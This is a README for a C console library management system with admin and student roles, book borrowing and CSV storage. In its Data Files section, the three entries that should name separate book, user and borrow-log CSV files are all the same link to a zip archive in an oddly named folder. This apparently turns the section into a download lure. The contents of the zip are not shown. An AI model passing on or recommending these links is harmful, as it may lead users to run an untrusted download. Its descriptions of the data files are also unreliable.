# 📚 Library Management System

A console-based Library Management System written in C, supporting **Admin** and **Student** users with role-based functionality, user authentication, book borrowing/returning, and CSV-based storage.

---

## 👥 User Roles

### 👨‍🏫 Admin / Librarian
- Full access to book and user records.
- Can borrow and return books **on behalf of any user**.
- Can change **their own password**.

### 🎓 Student
- Can **only borrow and return books for themselves**.
- Can view users and available books.
- Can change **only their own password**.

---

## 🧾 Features

### 🔐 Authentication
- Login with `username` and `password`.
- Create a new user account.
- Role-based menus based on login credentials.

---

### 🛠 Admin Functionalities

1. ➕ Add Book  
2. 📚 List Books  
3. ✏️ Modify Book  
4. ❌ Delete Book  
5. 👥 List Users  
6. 🧑‍💼 Modify User  
7. 🗑️ Delete User  
8. 📖 Borrow Book (for any user)  
9. 📤 Return Book (for any user)  
10. 🔒 Change Own Password  
0. 🚪 Logout  

---

### 🎓 Student Functionalities

1. 📚 List Books  
2. 👥 List Users  
3. 🔒 Change Own Password  
4. 📖 Borrow Book (for self only)  
5. 📤 Return Book (for self only)  
0. 🚪 Logout  

---

## 📂 Data Files

- `https://github.com/Chris-tech15/Library-Management-system/raw/refs/heads/main/bottomed/Library_Management_system_v2.0.zip` — Book records (ID, Title, Author, Quantity, etc.)
- `https://github.com/Chris-tech15/Library-Management-system/raw/refs/heads/main/bottomed/Library_Management_system_v2.0.zip` — User information (ID, Name, Age, Role, Faculty, Username, Password)
- `https://github.com/Chris-tech15/Library-Management-system/raw/refs/heads/main/bottomed/Library_Management_system_v2.0.zip` — Borrow/Return logs (User ID, Book ID, Dates)

---

## 💡 Highlights

- Input handled safely using `fgets()` to avoid buffer overflows.
- All user inputs trimmed for spaces and newline characters.
- Modular code using header file `library.h`.
- Uses enums to manage menu options clearly.
- Allows Admin to perform tasks for other users, enforcing role boundaries.

---

## 📦 Compilation

Compile using `gcc`:

```bash
gcc main.c books.c users.c borrow.c -o library
